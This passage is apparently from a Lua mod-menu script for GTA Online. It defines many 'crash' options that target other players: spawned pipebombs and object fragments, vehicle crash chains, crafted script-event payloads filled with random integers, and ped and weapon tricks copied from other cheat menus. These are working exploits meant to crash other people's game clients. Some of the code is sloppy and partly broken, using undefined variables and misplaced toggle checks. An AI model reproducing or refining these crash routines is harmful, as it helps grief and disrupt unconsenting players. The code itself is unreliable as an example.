                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                    util.yield(10)
                    entities.delete_by_handle(Object_pizza2)
                    entities.delete_by_handle(Object_pizza2)
                    entities.delete_by_handle(Object_pizza2)
                    entities.delete_by_handle(Object_pizza2)
                    return
                    end
                end
            end)

                menu.toggle(fragcrash, "Fragment Crash V3", {"togglefragv3"}, "", function(on_toggle)
                    if pid ~= players.user() then
                    --notification("Fragment Crash V3 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                if on_toggle then
                        menu.trigger_commands("togglefragv1" .. players.get_name(pid))
                        menu.trigger_commands("togglefragv2" .. players.get_name(pid))
                else
                        menu.trigger_commands("togglefragv1" .. players.get_name(pid))
                        menu.trigger_commands("togglefragv2" .. players.get_name(pid))
                        menu.trigger_commands("superc")
                        end
                    end
                end)
                
--[[
                local pipecrash = menu.list(crash, "PipeBomb Crash", {}, "")


                menu.toggle_loop(pipecrash, "PipeBomb Crash V1", {"togglepipev1"}, "Skidded From 2take1", function(on_toggle)
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
                    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                --if pid ~= players.user() then
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        ENTITY.SET_ENTITY_VELOCITY(object, 3, 4, 5)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(TargetPlayerPed, TargetPlayerPos, object, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0, -100, 0, true, false, true)
                        util.yield(300)
                        ENTITY.DETACH_ENTITY(object)
                        vcoords = ENTITY.GET_ENTITY_COORDS(object, true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, false, false, 1.0)
                        util.yield(1000)
                        entities.delete_by_handle(object)
                        ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
                        ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                    --end
                end)

                menu.toggle_loop(pipecrash, "PipeBomb Crash V2", {"togglepipev2"}, "", function(on_toggle)
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
                    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                    --if pid ~= players.user() then
                    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                    local Object_pizza2 = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    local Object_pizza2 = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    local Object_pizza2 = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    local Object_pizza2 = entities.create_object(util.joaat("w_ex_pipebomb"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    for i = 0, 100 do 
                        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_VELOCITY(object, 3, 4, 5)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(TargetPlayerPed, TargetPlayerPos, object, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0, -100, 0, true, false, true)
                        util.yield(300)
                        ENTITY.DETACH_ENTITY(object)
                        vcoords = ENTITY.GET_ENTITY_COORDS(object, true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, false, false, 1.0)
                    util.yield(10)
                    entities.delete_by_handle(Object_pizza2)
                    entities.delete_by_handle(Object_pizza2)
                    entities.delete_by_handle(Object_pizza2)
                    entities.delete_by_handle(Object_pizza2)
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
                    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                    return
                    --end
                end
            end)

                menu.toggle(pipecrash, "PipeBomb Crash V3", {"togglepipev3"}, "", function(on_toggle)
                    --if pid ~= players.user() then
                    --notification("PipeBomb Crash V3 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                if on_toggle then
                        menu.trigger_commands("togglepipev1" .. players.get_name(pid))
                        menu.trigger_commands("togglepipev2" .. players.get_name(pid))
                else
                        menu.trigger_commands("togglepipev1" .. players.get_name(pid))
                        menu.trigger_commands("togglepipev2" .. players.get_name(pid))
                        menu.trigger_commands("superc")
                        --end
                    end
                end)
]]

        local vehcrash = menu.list(crash, "Vehicle Crash", {}, "")

            menu.action(vehcrash, "Vehicle Crash", {"vehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function()
                    --notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                    util.yield(1500)
                    local hash = util.joaat("baller")
                    local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
                        STREAMING.REQUEST_MODEL(hash)
                        while not STREAMING.HAS_MODEL_LOADED(hash) do
                            util.yield()
                        end
                        local Coords1 = PlayerCoords.y + 10
                        local Coords2 = PlayerCoords.y - 10
                        local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
                        local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
                        -- Do stuff with veh ...
                        ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
                        ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
                    end
                    menu.trigger_commands("killveh" .. players.get_name(pid))
                    menu.trigger_commands("poptires" .. players.get_name(pid))
                    menu.trigger_commands("removedoors" .. players.get_name(pid))
                    menu.trigger_commands("slingshot" .. players.get_name(pid))
                    menu.trigger_commands("igniteveh" .. players.get_name(pid))
                    menu.trigger_commands("vehkick" .. players.get_name(pid))
                    menu.trigger_commands("novehs" .. players.get_name(pid))
                    menu.trigger_commands("delveh" .. players.get_name(pid))
                    menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("spatularcrash"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("nospat".. players.get_name(pid) .. " 100")
                    menu.trigger_commands("nospat".. players.get_name(pid) .. " 1")
                    menu.trigger_commands("nospat".. players.get_name(pid) .. " 100")
                    menu.trigger_commands("nospat".. players.get_name(pid) .. " 1")
                    util.yield(100)
                    menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
                    menu.trigger_commands("spatularcrash" .. PLAYER.GET_PLAYER_NAME(pid))
                    end)


                menu.toggle_loop(vehcrash, "Vehicle Crash", {"togglevehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function(on_toggle)
                    --notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                    util.yield(1500)
                    local hash = util.joaat("baller")
                    local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
                        STREAMING.REQUEST_MODEL(hash)
                        while not STREAMING.HAS_MODEL_LOADED(hash) do
                            util.yield()
                        end
                        local Coords1 = PlayerCoords.y + 10
                        local Coords2 = PlayerCoords.y - 10
                        local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
                        local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
                        -- Do stuff with veh ...
                        ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
                        ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
                        end
                        menu.trigger_commands("killveh" .. players.get_name(pid))
                        menu.trigger_commands("poptires" .. players.get_name(pid))
                        menu.trigger_commands("removedoors" .. players.get_name(pid))
                        menu.trigger_commands("slingshot" .. players.get_name(pid))
                        menu.trigger_commands("igniteveh" .. players.get_name(pid))
                        menu.trigger_commands("vehkick" .. players.get_name(pid))
                        menu.trigger_commands("novehs" .. players.get_name(pid))
                        menu.trigger_commands("delveh" .. players.get_name(pid))
                        menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
                        menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
                        menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
                        menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
                        menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
                        menu.trigger_commands("spatularcrash"..PLAYER.GET_PLAYER_NAME(pid))
                        menu.trigger_commands("nospat".. players.get_name(pid) .. " 100")
                        menu.trigger_commands("nospat".. players.get_name(pid) .. " 1")
                        menu.trigger_commands("nospat".. players.get_name(pid) .. " 100")
                        menu.trigger_commands("nospat".. players.get_name(pid) .. " 1")
                        util.yield(100)
                        menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
                        menu.trigger_commands("spatularcrash" .. PLAYER.GET_PLAYER_NAME(pid))
                        end)

            --[[
            local scrash = menu.list(crash, "Script Event Crashes", {}, "Won't work on yourself report any not working at all please.")

            menu.toggle_loop(scrash, "SE Crash (S0)", {"crashs0"}, "A very strong SE/SH crash.", function(on_toggle)
                local int_min = -2147483647
                local int_max = 2147483647
                for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max), math.random(int_min, int_max), 
                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                    util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                util.yield()
                for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, pid, math.random(int_min, int_max)})
                    util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                    util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                end
            end)

            menu.toggle_loop(scrash, "SE Crash (S1)", {"crashs1"}, "A very strong SE/SH crash.", function(on_toggle)
                local int_min = -2147483647
                local int_max = 2147483647
                    for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                    end
                    menu.trigger_commands("givesh" .. players.get_name(pid))
                    util.yield()
                    for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, pid, math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                        util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                    end
                end)

                

                menu.toggle_loop(scrash, "SE Crash (S3)", {"crashs3"}, "A very strong SE/SH crash.", function(on_toggle)
                    local int_min = -2147483647
                    local int_max = 2147483647
                    for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {-1990614866, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max), 
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {-1990614866, 0, 0})
                        end
                        menu.trigger_commands("givesh" .. players.get_name(pid))
                        util.yield()
                    for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {-1990614866, 0, 0, pid, math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {-1990614866, 0, 0})
                        util.trigger_script_event(1 << pid, {-1990614866, 0, 0})
                        end
                    end)  

                menu.toggle_loop(scrash, "SE Crash (S4)", {"crashs4"}, "A very strong SE/SH crash.", function(on_toggle)
                    local int_min = -2147483647
                    local int_max = 2147483647
                    for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1})
                        end
                        menu.trigger_commands("givesh" .. players.get_name(pid))
                        util.yield()
                    for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1, pid, math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1})
                        util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1})
                        end
                    end)      

           menu.toggle_loop(scrash, "SE Crash (S7)", {"crashs7"}, "A very strong SE/SH crash.", function(on_toggle)
                local int_min = -2147483647
                local int_max = 2147483647
                for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max), math.random(int_min, int_max), 
                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                    util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                    end
                    menu.trigger_commands("givesh" .. players.get_name(pid))
                    util.yield()
                for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, pid, math.random(int_min, int_max)})
                    util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                    util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                    end
                end)

                menu.toggle_loop(scrash, "SUS Crash", {"togglesus"}, "This one is bound to hurt.", function(on_toggle)

                        local int_min = -2147483647
                        local int_max = 2147483647
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, pid, math.random(int_min, int_max), math.random(int_min, int_max), 
                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                                end
                                util.yield()
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, pid, math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, pid, math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                                util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1})
                                util.trigger_script_event(1 << pid, {-1990614866, 0, 0})
                                util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                                end
                                menu.trigger_commands("explode" .. players.get_name(pid))
                                util.yield(100)
                                menu.trigger_commands("explodeloop" .. players.get_name(pid))
                                util.yield(100)
                                menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 0")
                                menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
                                util.yield(100)
                                menu.trigger_commands("givesh" .. players.get_name(pid))
                                util.trigger_script_event(1 << pid, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                                util.trigger_script_event(1 << pid, {697566862, 3, 10, 9, 1, 1, 1})
                                util.trigger_script_event(1 << pid, {-1990614866, 0, 0})
                                util.trigger_script_event(1 << pid, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                --notification("SUS Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                            end)

]]

            local oxtypecrash = menu.list(crash, "Ox Menu Type Crashes", {}, "From Nightfall")

            local oxtypecrashclick = menu.list(oxtypecrash, "Ox Menu Type Crashes Click", {}, "From Nightfall")

            menu.action(oxtypecrashclick, "All Ox Menu Type Crashes", {"oxallcrash"}, "Spam it for stronger results... Use Panic Mode If Needed.", function()
                if on_toggle then
                menu.trigger_commands("clickcombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickbeverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickmanuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickwadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickshophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfranklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicklazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicksiemoncrash" .. players.get_name(pid))
                util.yield(1000)
            else
                menu.trigger_commands("clickcombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickbeverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickmanuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktaostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicktenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickwadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickshophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clickfranklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicklazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("clicksiemoncrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("superc")
                util.yield(10)
                menu.trigger_commands("superc")
                            end
                      end)

                      
            menu.action(oxtypecrashclick, "Combat Crash", {"clickcombat"}, "", function()
                
            local mdl = util.joaat('A_F_M_ProlHost_01')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_COMBATMG'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
